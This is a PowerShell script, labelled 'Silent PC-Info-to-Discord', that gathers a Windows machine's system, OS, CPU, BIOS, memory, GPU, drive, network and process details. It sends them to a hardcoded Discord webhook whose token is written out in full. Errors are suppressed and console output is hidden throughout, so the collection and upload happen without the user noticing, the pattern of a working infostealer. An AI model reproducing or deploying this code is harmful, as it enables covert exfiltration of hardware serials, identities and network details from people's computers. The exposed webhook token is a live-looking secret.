###############################################################################
# TS - Titan Service: Silent PC-Info-to-Discord Script (English)
# Sends only the specified 9 categories to Discord, with no console output
###############################################################################

# Prevent console error messages
$ErrorActionPreference = "SilentlyContinue"

# 1) DISCORD WEBHOOK URL
$DiscordWebhookUrl = "https://discord.com/api/webhooks/1321463940802416662/vEfq26I3sIET-oKyzZxFPKsY4NaZ3HWLv1yUxkd9og6eZTHgxanJo4lYxkXL3Atx9pXN"

# 2) FUNCTION TO SEND A MESSAGE TO DISCORD
function Send-DiscordMessage {
    param (
        [Parameter(Mandatory = $true)]
        [string] $Content
    )

    $jsonBody = @{ content = $Content } | ConvertTo-Json

    try {
        Invoke-RestMethod -Uri $DiscordWebhookUrl `
                          -Method Post `
                          -Body $jsonBody `
                          -ContentType "application/json" | Out-Null
    }
    catch {
        # SilentlyContinue means no console error output
    }
}

###############################################################################
# SYSTEM BASICS
###############################################################################
try {
    $computerSystem = Get-CimInstance -ClassName Win32_ComputerSystem
    $msgSystem = ">>> System Basics <<<`n"
    $msgSystem += "Computer Name:          $($computerSystem.Name)`n"
    $msgSystem += "Manufacturer:           $($computerSystem.Manufacturer)`n"
    $msgSystem += "Model:                  $($computerSystem.Model)`n"
    $msgSystem += "Primary Owner:          $($computerSystem.PrimaryOwnerName)`n"
    $msgSystem += "Domain/Workgroup:       $($computerSystem.Domain)`n"
    $msgSystem += "Total RAM (GB):         " + [Math]::Round($computerSystem.TotalPhysicalMemory / 1GB, 2)

    Send-DiscordMessage -Content $msgSystem
}
catch {}

###############################################################################
# OPERATING SYSTEM INFO
###############################################################################
try {
    $os = Get-CimInstance -ClassName Win32_OperatingSystem
    $msgOS = ">>> Operating System Info <<<`n"
    $msgOS += "Name:                   $($os.Caption)`n"
    $msgOS += "Version:                $($os.Version)`n"
    $msgOS += "Architecture:           $($os.OSArchitecture)`n"
    $msgOS += "Install Date:           $($os.InstallDate)`n"
    $msgOS += "Last Boot:              $($os.LastBootUpTime)`n"
    $msgOS += "Build Number:           $($os.BuildNumber)`n"
    $msgOS += "Registered User:        $($os.RegisteredUser)`n"
    $msgOS += "Serial Number (OS):     $($os.SerialNumber)"

    Send-DiscordMessage -Content $msgOS
}
catch {}

###############################################################################
# CPU INFO
###############################################################################
try {
    $cpuList = Get-CimInstance -ClassName Win32_Processor
    $msgCPU = ">>> CPU Info <<<`n"
    foreach ($cpu in $cpuList) {
        $msgCPU += "Name:                   $($cpu.Name)`n"
        $msgCPU += "Cores:                  $($cpu.NumberOfCores)`n"
        $msgCPU += "Logical Processors:     $($cpu.NumberOfLogicalProcessors)`n"
        $msgCPU += "Clock Speed (MHz):      $($cpu.MaxClockSpeed)`n"
        $msgCPU += "Processor ID:           $($cpu.ProcessorId)`n`n"
    }

    Send-DiscordMessage -Content $msgCPU
}
catch {}

###############################################################################
# BIOS INFO
###############################################################################
try {
    $bios = Get-CimInstance -ClassName Win32_BIOS
    $msgBIOS = ">>> BIOS Info <<<`n"
    $msgBIOS += "BIOS Version:           $($bios.SMBIOSBIOSVersion)`n"
    $msgBIOS += "Release Date:           $($bios.ReleaseDate)`n"
    $msgBIOS += "Manufacturer:           $($bios.Manufacturer)`n"
    $msgBIOS += "Serial Number (BIOS):   $($bios.SerialNumber)"

    Send-DiscordMessage -Content $msgBIOS
}
catch {}

###############################################################################
# MEMORY INFO
###############################################################################
try {
    $memModules = Get-CimInstance -ClassName Win32_PhysicalMemory
    $msgMemory = ">>> Memory Info <<<`n"
    $i = 1
    foreach ($mem in $memModules) {
        $msgMemory += "Memory Module #${i}:`n"
        $msgMemory += "  Capacity (GB):   " + [Math]::Round($mem.Capacity / 1GB, 2) + "`n"
        $msgMemory += "  Speed (MHz):     $($mem.Speed)`n"
        $msgMemory += "  Manufacturer:    $($mem.Manufacturer)`n"
        $msgMemory += "  Serial Number:   $($mem.SerialNumber)`n`n"
        $i++
    }

    Send-DiscordMessage -Content $msgMemory
}
catch {}

###############################################################################
# GPU INFO
###############################################################################
try {
    $gpuList = Get-CimInstance -ClassName Win32_VideoController
    $msgGPU = ">>> GPU Info <<<`n"
    $j = 1
    foreach ($gpu in $gpuList) {
        $msgGPU += "GPU #${j}:`n"
        $msgGPU += "  Name:            $($gpu.Name)`n"
        $msgGPU += "  Memory (MB):     " + [Math]::Round($gpu.AdapterRAM / 1MB, 2) + "`n"
        $msgGPU += "  Driver Version:  $($gpu.DriverVersion)`n`n"
        $j++
    }

    Send-DiscordMessage -Content $msgGPU
}
catch {}

###############################################################################
# DRIVE INFO
###############################################################################
try {
    $diskDrives = Get-CimInstance -ClassName Win32_DiskDrive
    $logicalDrives = Get-CimInstance -ClassName Win32_LogicalDisk

    $msgDrives = ">>> Drive Info <<<`n`n"
    $msgDrives += "Physical Drives:`n"
    foreach ($drive in $diskDrives) {
        $msgDrives += "  Name:               $($drive.Name)`n"
        $msgDrives += "  Model:              $($drive.Model)`n"
        $msgDrives += "  Serial Number:      $($drive.SerialNumber)`n"
        $msgDrives += "  Interface:          $($drive.InterfaceType)`n"
        $msgDrives += ("  Capacity (GB):      " + [Math]::Round($drive.Size / 1GB, 2) + "`n`n")
    }

    $msgDrives += "Logical Drives:`n"
    foreach ($lDrive in $logicalDrives) {
        $msgDrives += "  Drive:             $($lDrive.DeviceID)`n"
        $msgDrives += "  File System:       $($lDrive.FileSystem)`n"
        if ($lDrive.FreeSpace) {
            $msgDrives += ("  Free Space (GB):   " + [Math]::Round($lDrive.FreeSpace / 1GB, 2) + "`n")
        }
        if ($lDrive.Size) {
            $msgDrives += ("  Total Size (GB):   " + [Math]::Round($lDrive.Size / 1GB, 2) + "`n")
        }
        $msgDrives += "`n"
    }

    Send-DiscordMessage -Content $msgDrives
}
catch {}

###############################################################################
# NETWORK INFO
###############################################################################
try {
    $netAdapters = Get-NetIPConfiguration
    $msgNet = ">>> Network Info <<<`n"

    foreach ($adapter in $netAdapters) {
        $msgNet += "Adapter:               $($adapter.InterfaceAlias)`n"
        $ipv4 = $adapter.IPv4Address
        if ($ipv4) {
            $msgNet += "  IPv4 Address:        $($ipv4.IPAddress)`n"
            $msgNet += "  Subnet Mask:         $($ipv4.PrefixLength)`n"
        }
        $gw = $adapter.IPv4DefaultGateway
        if ($gw) {
            $msgNet += "  Gateway:             $($gw.NextHop)`n"
        }
        $dns = $adapter.DNSServer.ServerAddresses
        if ($dns) {
            $msgNet += "  DNS Server(s):       " + ($dns -join ", ") + "`n"
        }
        $msgNet += "`n"
    }

    Send-DiscordMessage -Content $msgNet
}
catch {}

###############################################################################
# PROCESS INFO (ONLY 10 UNIQUE)
###############################################################################
try {
    $uniqueProcesses = Get-Process | Group-Object -Property Name | Sort-Object -Property Name
    $uniqueProcesses = $uniqueProcesses | Select-Object -First 10

    $msgProcs = ">>> Process Info (Only 10 unique) <<<`n"
    foreach ($procGroup in $uniqueProcesses) {
        $msgProcs += "Name: $($procGroup.Name)  (Instances: $($procGroup.Count))`n"
    }

    Send-DiscordMessage -Content $msgProcs
}
catch {}

# End of script, no output in console
